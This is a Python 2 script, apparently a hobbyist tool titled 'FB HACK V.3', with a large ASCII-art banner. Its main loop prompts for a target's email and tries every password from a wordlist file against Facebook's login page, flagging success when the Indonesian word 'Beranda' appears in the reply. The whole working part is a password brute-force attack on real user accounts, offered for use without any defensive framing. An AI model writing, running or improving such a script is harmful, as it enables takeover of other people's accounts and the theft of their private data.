import sys
import requests
from time import sleep
import termcolor
import os

#COLORS
'\033[34;1m' #biru
'\033[32;1m' #ijo
'\033[35;1m' #purple
'\033[36;1m' #cyan                                                       
'\033[31;1m' #meraH
'\033[37;1m' #putiH
'\033[33;1m' #kuning




print """\033[36;1m                                                                                                                        
                                                  ``    ``     ``   ``                                                  
                                        `        ..      ..   -`      .`   ``-.``                                       
                                   `.-:-`        /        :` .-       .:    .- `.-.                                     
                                   `` `+`        +`       /. :-       -:   `+`    +.   `.`                              
                            `-:::`     .o`     ` -+`     `o` .o      .o`   +-     s.    /o:`                            
                         `:oo.``-s      :o    .y  -o:```:o.   :o-``./o.   :o     +/     o:`  /-                         
                         -:.s+  :d//.    /o   .d-  `-/+/:`     .:++/-`  ::h.   .o/      h-`:/oo:                        
                            `/ss/...o/   .ho+o//--:/+osyhddddddhyyso+/--:/o++++/.      .d+/-.`                          
                              .s/   .h  -+//+shmmNMMMMMMMMMMMMMMMMMMMMNNmdyo/-`       :s-                               
                               `/o.:s/.:ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+-.o+o+`                                
                                `oyoohmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdyoso.                                
                                .sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmy/`                               
                             `:ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdo.                             
                           `/hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms-                           
                          :hMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMNs.                         
                        -yNMMMMMMNdyymMMMMMMMMMMNNNmmdddddddddddddddmmNNMMMMMMMMMMMdyhmNMMMMMMm+`                       
                      `+mMMMMMNy/.-sNMMMMMMMMNmmmmmddmNNddNNdMNdmNNmdmmmmmmNMMMMMMMMm+.-+dMMMMMMh-                      
                     .yMMMmyhy-  /mMMMMMMMNmmmNMNmdNMMMmdMMNdMMNdNMMNmdmMNNmmmNMMMMMMMh. `/dhhNMMN+`                    
                    -dMMm+-ys` .omMMMMMNmdddmNNmdmMMMMmdNMMNdMMMmdNMMMNmdNNNmddmNMMMMMMh/` -d+-yMMMs`                   
                   -mMMm- od`.oy/dMMMNmdNMMNNmdddmNNNNdmMMNdhmNNNdmNNNmmdddmNMMNmdmMMMMooy/`:N- +NMMy`                  
                  -mMhd: `moss:.sMMMmdNMMMMMMdmMNNNmmddmdo:ss:.:yddmmNNNMNdmMMMMMNmdNMMN:.+yoho  yhmMy`                 
                 .mMs:m` /d+.`-hMMNdmMMMMMMMddMMMMMMMdmMN.`ydy  :MdmMMMMMMNdNMMMMMMNdmMMNo.`-od. /d-dMs                 
                `hMy :N`./`./yNMMNdNMMMMMMMmdMMMMMMMNdNMMNmmh/`:dMmdMMMMMMMNdNMMMMMMMmdNMMmo:`./ /m`.mM/                
                +MN. -N.`.oh+hMMNddNNMMMMMNdNMMMMMMMmdMMMMMN/odMMMNdNMMMMMMMmdMMMMMMNmddNMM+sh/.`od  oMN.               
               `mMm` `N-oy/`/MMNdNNNmmmmmmddNMMMMMMMdmMMMMMmsMMMMMMdNMMMMMMMNdmmmmmmmNNmdMMm..oh/ss  /MMs               
               +MNm`  mh:  /NMMdmMMMMMMMNmdmmmmmmmmmddNNNNm/-sNNNNmddmmmmmmmmddNMMMMMMMMdmMMd. `odo  /NMN.              
               dMoN/ `y` `oNMMmdMMMMMMMMMmdMMMMMMMMNdmNNNNd:.oNNNNNddNMMMMMMMNdNMMMMMMMMNdNMMd:  :s  hhdM+              
              .NN.dm``- :dsNMMdmMMMMMMMMMdmMMMMMMMMNhNMMMMMmdMMMMMMmdMMMMMMMMMdmMMMMMMMMMdmMMydy. : :M++Mh              
              :Md /Ms``oNo.NMNdNMMMMMMMMMdNMMMMMMMMNdMMNmms+++ymmMMmdMMMMMMMMMdmMMMMMMMMMmdMMh.hm:``mm`-Mm              
              /Mm` sN-sm: /MMmdNMMMMMMMMNdNMMMMMMMMNdd++Ny+. :odm:sddNMMMMMMMMmdMMMMMMMMMmdMMN` sN-sN: :MN`             
              +MM-  sdm-  dMMmdmmmmmmmmmmhdmmmmmdhs+-  oMMd. /NMN- `:oydmmmmmmddmmmmmmmmmddMMM+  +dm:  sMM`             
              /MMy  `d+  +NMMNdMMMMMMMMMNdmo/:-.`     .NMNdy.mdMMy      `.-:/hmdMMMMMMMMMmdMMMm.  m+  .NMN`             
              -Mmdo  :: .NomMNdNMMMMMMMMMds           :MMMM: yMMMm           .dmMMMMMMMMMmdMMshy  s` .dhMm              
              `Nd:my.`- yN.+MMdmMMMMMMMMMd/           .NMMm  -MMMy            yNMMMMMMMMMdNMN.oM: : :mh:Ms              
               yN.-hm/``Nh `NMNdNMMMMMMMMm.            oMMh  .MMN-            +MMMMMMMMMmdMMy .Ns .sNo`+M:              
               :My `/dy-N/  dMMmdMMMMNNmmy             `yMh  `NN/             .dmNNNMMMNdNMM+  hs/dy. .md`              
                hMy` `/hN-  yhdMddmmmmNNNs              `sy  `m:              .mNNmmmmmdmMym:  smy-  :mM/               
                -NMm:  `so  sm.sNddNMMMMM:                .   .                yMMMMMNdmN//M- `h/  `oNMh`               
                 +Mmhy:` :. /M:`oNmdNMMMN.                                     +MMMMNdmm: yN` /. .+hyMm.                
                  sMo+hdo:.``ms  sMmdNMMd                                      -MMNmdNN: `Ns ../ymy:dN:                 
                  `yNo.:ydds:+m` `hmNmdNs                                      `NmdmmN+  /m-/ydho-.hN/                  
                   `yNh:``-+syms` .d+sdm/                                       hmh+yy` .mhyo/.``+mN/                   
                    `oNNh/.  `-++. /d-.o:                                       o/`od.`-o/.`  -omMm:                    
                      /mMMhs/-```..`+d-                                          `od-`..``.-+ymMMy.                     
                       .yNNsoyhhyso+:od+.                                      `-yh//+oyhhhsohMm+`                      
                         :dNd+:--://///++/-`                                `.:/++////::--:smNs.                        
                          `/dNmho/-.`````..:/os+                        `ss+:-.``````.-/sdNNy-                          
                            `/hNMNhyyhhhhdddy+-`                         .:ohdddhhhhyydMMms-                            
                              `:smmy+::--..`                             `   `.---:/odNd+.                              
                            ````.-/ymmdyso++osh:                         syso++oshdmds:..                               
                          `-.    -:`.:sdNMMMMMM-                         sMMMMMNmho-` `-`-`                             
                          /.   ``..   :+:/shmNN.                         +NNdyo+/:/`      ::`  `                        
                          o-   :s-  `:/o:  `++:                         `-//` `s. ::       -o-/-                        
                          `://oo` `:s:`y`   od  `++- `-.-.`  `.` `-:. `+:--s/  `  .s      .//-                          
                              -`:+o--:/d   :oy`.oh.  `.:y--  -ys-`.y` s.    --`    s-     .`                            
                                `-:` .-y  `y`+o+-s     :o     o-+/ s. y.   `:y.    `o                                   
                                     -/o-:s: `- o:     +:     +: :+// -o`   `ss                                         
                                         `-:  ./h-   ``s.     ++  -sh  ./////.`                                         
                                                `.  .::+//-  -++:  `/                                                   
                                                                                                                       """

os.system("figlet B R U T E F O R C E | lolcat")
os.system("figlet F B  H A C K  V.3 | lolcat")


email = raw_input ("\033[32;1mEmail Target = \033[32;1m")


url='https://free.facebook.com/login.php'
ex = open('password.txt', 'r').readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url, data ={'email':email, 'pass':password, 'login':"submit"})
    content = http.content
    if "Beranda" in content :
        print "\033[32;1mPassword Found !",password
        sys.exit(1)

    else :
        print "\033[31;1mPassword Failed !",password
